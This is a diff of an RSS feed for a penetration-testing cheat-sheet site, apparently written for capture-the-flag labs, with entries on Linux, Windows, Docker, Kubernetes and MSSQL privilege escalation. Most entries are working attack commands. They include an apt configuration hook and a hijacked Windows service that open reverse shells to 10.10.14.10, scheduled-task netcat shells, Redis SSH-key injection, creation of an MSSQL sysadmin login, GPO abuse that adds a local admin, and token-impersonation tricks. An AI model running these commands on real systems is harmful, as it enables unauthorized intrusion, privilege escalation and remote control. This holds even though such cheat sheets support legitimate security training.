@@ -22,11 +22,18 @@
       <description> MITM (Man-in-the-Middle) In target # In target export http_proxy=http://10.10.14.10:8888 In local # Tool pip3 install --upgrade proxy.py # Start a proxy server proxy --hostname 0.0.0.0 --port 8888 # Edit /etc/hosts to point to yours server 10.10.14.10 apt.update.example.com Privesc Abuse apt update # Create a malicious config echo &amp;#39;APT::Update::Pre-Invoke {&amp;#34;bash -c &amp;#39;\&amp;#39;&amp;#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.10/1337 0&amp;gt;&amp;amp;1&amp;#39;\&amp;#39;&amp;#39;&amp;#34;}&amp;#39; &amp;gt; /etc/apt/apt.conf.d/evil # Exploit sudo apt update -y </description>
     </item>
     <item>
+      <title>Built-in Group</title>
+      <link>https://tldrbins.github.io/built-in_group/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/built-in_group/</guid>
+      <description> Privesc Modify Service Path # Start a nc listener rlwrap nc -lvnp 443 # Assumed nc.exe is uploaded sc.exe config VSS binpath=&amp;#34;C:\Windows\Tasks\nc.exe -e cmd 10.10.14.10 443&amp;#34; # Stop service sc.exe stop VSS # Start service sc.exe start VSS </description>
+    </item>
+    <item>
       <title>Docker</title>
       <link>https://tldrbins.github.io/docker/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/docker/</guid>
-      <description>Privesc Abuse docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it image_name bash # Check ls /mnt/root Docker API # Show running containers curl -s --unix-socket /var/run/docker.sock http://localhost/images/json # Create container curl -s -X POST -H &amp;#39;Content-Type: application/json&amp;#39; --data-binary &amp;#39;{&amp;#34;Image&amp;#34;: &amp;#34;&amp;lt;image_name&amp;gt;:latest&amp;#34;,&amp;#34;HostConfig&amp;#34;: {&amp;#34;Binds&amp;#34;: [&amp;#34;/:/r&amp;#34;]}, &amp;#34;Cmd&amp;#34;: [&amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;ls -la /r/root/&amp;#34;], &amp;#34;Tty&amp;#34;: true}&amp;#39; --unix-socket /var/run/docker.sock http://localhost/containers/create # Start container curl -s -X POST -H &amp;#39;Content-Type: application/json&amp;#39; --unix-socket /var/run/docker.</description>
+      <description>Basic Commands # Show all running processes sudo docker ps -a # Show all images sudo docker images -a # Stop all processes sudo docker stop $(sudo docker ps -a -q) # Remove all processes sudo docker rm -vf $(sudo docker ps -a -q) # Remove all images sudo docker rmi -f $(sudo docker images -aq) Explore Docker image dive&#xA;dive docker-archive://image.tar Privesc Abuse docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it image_name bash # Check ls /mnt/root Docker API # Show running containers curl -s --unix-socket /var/run/docker.</description>
     </item>
     <item>
       <title>git</title>
@@ -34,6 +41,20 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/git/</guid>
       <description>Basic Commands # Show status git status # Reset the current branch to a previous commit git reset --hard # Show information about files git ls-files --stage # Show current branch git branch # Show commits git log &amp;#39;branch_name&amp;#39; --oneline # Show diff, a and b are commit hash # a is the older commit git diff [a] [b] # Show commit git show &amp;#39;commit_hash&amp;#39; SUDO # Copy target project cp -r /var/www/html/project .</description>
+    </item>
+    <item>
+      <title>GPOs</title>
+      <link>https://tldrbins.github.io/gpos/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/gpos/</guid>
+      <description> GPO Abuse SharpGPOAbuse&#xA;List GPOs Name Get-GPO -All | Select-Object DisplayName Add localAdmin .\SharpGPOAbuse.exe --AddLocalADmin --UserAccount &amp;lt;USERNAME&amp;gt; --GPOName &amp;lt;GPO_NAME&amp;gt; Force reload gpupdate /force </description>
+    </item>
+    <item>
+      <title>Kubernetes</title>
+      <link>https://tldrbins.github.io/kubernetes/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/kubernetes/</guid>
+      <description>Token Location /run/secrets/kubernetes.io/serviceaccount/token Certificate Location /run/secrets/kubernetes.io/serviceaccount/ca.crt Tools kubectl&#xA;Basic Commands # List all namespaces kubectl --token &amp;lt;token&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 get namespaces # Get user permissions in current namespace kubectl --token &amp;lt;token&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list # Get user permissions in specific namespace kubectl --token &amp;lt;token&amp;gt; --certificate-authority ca.crt --server https://10.10.11.10:8443 auth can-i --list -n &amp;lt;namespace_name&amp;gt; # List all pods kubectl --token &amp;lt;token&amp;gt; --certificate-authority ca.crt --server https://10.</description>
     </item>
     <item>
       <title>Linux hard disk encryption</title>
@@ -57,11 +78,18 @@
       <description>Metasploit Start Metasploit msfconsole -q Basic Commands # Return to previous page back # Upgrade session sessions -u # quit metasploit exit Search Exploit # For example: samba search samba # Choose by #num use 15 # Choose by full path use exploit/multi/samba/usermap_script # Show exploit settings options # Set option, e.g. set rhosts 10.10.11.10 set lhost 10.10.14.10 set lport 1337 # Run exploit run Hint: If you see a session is opened, but sit at an empty line, just type your cmd and press enter</description>
     </item>
     <item>
+      <title>MSSQL Agent Jobs</title>
+      <link>https://tldrbins.github.io/mssql_agent_jobs/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/mssql_agent_jobs/</guid>
+      <description>1. Pre-check # List principals SELECT name FROM sys.database_principals; # Check privilege over a principal from current user SELECT entity_name, permission_name FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Fix : Cannot resolve the collation conflict between &amp;#34;Latin1_General_CI_AI&amp;#34; and &amp;#34;SQL_Latin1_General_CP1_CI_AS&amp;#34; SELECT entity_name collate DATABASE_DEFAULT,permission_name collate DATABASE_DEFAULT FROM fn_my_permissions(&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;, &amp;#39;USER&amp;#39;); # Check SQL credentials SELECT name, credential_identity FROM sys.credentials; 2. Check proxy account name and permissions # Create a table to store info CREATE TABLE proxies (subsystem_id INT PRIMARY KEY NOT NULL, subsystem_name varchar(255), proxy_id INT, proxy_name varchar(255)); # Insert proxy info into table EXECUTE AS LOGIN=&amp;#39;&amp;lt;PRINCIPAL&amp;gt;&amp;#39;; INSERT proxies EXEC msdb.</description>
+    </item>
+    <item>
       <title>MSSQL Linked Servers</title>
       <link>https://tldrbins.github.io/mssql_linked_server/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/mssql_linked_server/</guid>
-      <description>Linked Servers Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [LINKED_SERVER]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [CURRENT_SERVER]&amp;#39;) at [LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN test WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;Test1234!</description>
+      <description> Linked Servers Basic Commands Hint: Use double &#39;&#39; to escape &#39; in mssql&#xA;# Show current server select @@servername # Show linked servers select srvname from sysservers; Execute Query between Linked Servers # Execute query from current server to linked server EXECUTE (&amp;#39;select @@version;&amp;#39;) at [LINKED_SERVER]; # Execute query from linked server to current server EXECUTE (&amp;#39;EXECUTE (&amp;#39;&amp;#39;SELECT entity_name, permission_name FROM fn_my_permissions(NULL, &amp;#39;&amp;#39;&amp;#39;&amp;#39;SERVER&amp;#39;&amp;#39;&amp;#39;&amp;#39;);&amp;#39;&amp;#39;) at [CURRENT_SERVER]&amp;#39;) at [LINKED_SERVER]; Privilege Escalation Create Admin User from Privilege Linked Server EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;CREATE LOGIN test WITH PASSWORD = &amp;#39;&amp;#39;&amp;#39;&amp;#39;password&amp;#39;&amp;#39;&amp;#39;&amp;#39;;&amp;#39;&amp;#39;) AT [CURRENT_SERVER]&amp;#39;) AT [LINKED_SERVER] EXECUTE(&amp;#39;EXECUTE(&amp;#39;&amp;#39;EXEC sp_addsrvrolemember &amp;#39;&amp;#39;&amp;#39;&amp;#39;test&amp;#39;&amp;#39;&amp;#39;&amp;#39;, &amp;#39;&amp;#39;&amp;#39;&amp;#39;sysadmin&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;&amp;#39;) AT [CURRENT_SERVER]&amp;#39;) AT [LINKED_SERVER] </description>
     </item>
     <item>
       <title>MSSQL Privilege Escalation</title>
@@ -89,7 +117,7 @@
       <link>https://tldrbins.github.io/redis/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/redis/</guid>
-      <description>Basic Commands # Connect redis-cli -h 127.0.0.1 # List current keys keys * # Add key incr key # Get key value get key Arbitrary Write to RCE (echo -e &amp;#34;\n\n&amp;#34;; cat id_rsa.pub; echo -e &amp;#34;\n\n&amp;#34;) &amp;gt; foo.txt # Deletes all keys from all databases on current host redis-cli -h 127.0.0.1 flushall cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit redis-cli -h 127.0.0.1 config set dir /home/user/.ssh/ redis-cli -h 127.</description>
+      <description>Basic Commands # Connect redis-cli -h 127.0.0.1 # Provide password auth password # List current keys keys * # Add key incr key # Get key value get key Arbitrary Write to RCE (echo -e &amp;#34;\n\n&amp;#34;; cat id_rsa.pub; echo -e &amp;#34;\n\n&amp;#34;) &amp;gt; foo.txt # Deletes all keys from all databases on current host redis-cli -h 127.0.0.1 flushall cat foo.txt | redis-cli -h 127.0.0.1 -x set crackit redis-cli -h 127.0.0.1 config set dir /home/user/.</description>
     </item>
     <item>
       <title>SeBackupPrivilege/SeRestorePrivilege</title>
@@ -97,6 +125,20 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/sebackupprivilege/</guid>
       <description>robocopy # For example robocopy /b &amp;lt;target_dir_path&amp;gt; C:\Windows\Tasks &amp;lt;target_file&amp;gt; Helper dlls SeBackupPrivilegeUtils.dll&#xA;SeBackupPrivilegeCmdLets.dll&#xA;import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll Copy-FileSeBackupPrivilege &amp;lt;target_file_path&amp;gt; C:\Windows\Tasks\&amp;lt;target_file&amp;gt; # For example Copy-FileSeBackupPrivilege C:\Windows\ntds\ntds.dit C:\Windows\Tasks\ntds.dit diskshadow Create a .dsh file set context persistent nowriters set metadata C:\Windows\Tasks\test.cab set verbose on add volume c: alias test create expose %test% x: # Convert to dos format unix2dos vss.dsh Run vss.dsh # Upload and run diskshadow /s C:\Windows\Tasks\vss.dsh Host a smb server (In Linux) impacket-smbserver share .</description>
+    </item>
+    <item>
+      <title>SeDebugPrivilege</title>
+      <link>https://tldrbins.github.io/sedebugprivilege/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/sedebugprivilege/</guid>
+      <description> Method #1: Meterpreter Migrate # Inside meterpreter ps winlogon migrate &amp;lt;PID&amp;gt; Method #2 : psgetsys.ps1 psgetsys&#xA;# Import module . .\psgetsys.ps1 ImpersonateFromParentPid -ppid &amp;lt;PID&amp;gt; -command &amp;#34;c:\windows\system32\cmd.exe&amp;#34; -cmdargs &amp;#34;/c &amp;lt;powershell #3 Base64&amp;gt;&amp;#34; </description>
+    </item>
+    <item>
+      <title>SeImpresonate</title>
+      <link>https://tldrbins.github.io/seimpresonate/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/seimpresonate/</guid>
+      <description>Recover SeImpresonate FullPower&#xA;.\FullPowers.exe -c &amp;#34;whoami /priv&amp;#34; # Revshell .\FullPowers.exe -c &amp;#34;&amp;lt;powershell #3 Base64&amp;gt;&amp;#34; Recover tokens via schedule task # Create a list of privileges [System.String[]]$Privs = &amp;#34;SeAssignPrimaryTokenPrivilege&amp;#34;, &amp;#34;SeAuditPrivilege&amp;#34;, &amp;#34;SeChangeNotifyPrivilege&amp;#34;, &amp;#34;SeCreateGlobalPrivilege&amp;#34;, &amp;#34;SeImpersonatePrivilege&amp;#34;, &amp;#34;SeIncreaseQuotaPrivilege&amp;#34;, &amp;#34;SeIncreaseWorkingSetPrivilege&amp;#34;, &amp;#34;SeTimeZonePrivilege&amp;#34; # Create a Principal for the task $TaskPrincipal = New-ScheduledTaskPrincipal -UserId &amp;#34;&amp;lt;SERVICE_ACCOUNT&amp;gt;&amp;#34; -LogonType ServiceAccount -RequiredPrivilege $Privs # Create an action for the task $TaskAction = New-ScheduledTaskAction -Execute &amp;#34;powershell.exe&amp;#34; -Argument &amp;#34;-Exec Bypass -Command `C:\\Windows\\Tasks\\nc.exe -e powershell 10.</description>
     </item>
     <item>
       <title>SeLoadDriverPrivilege</title>
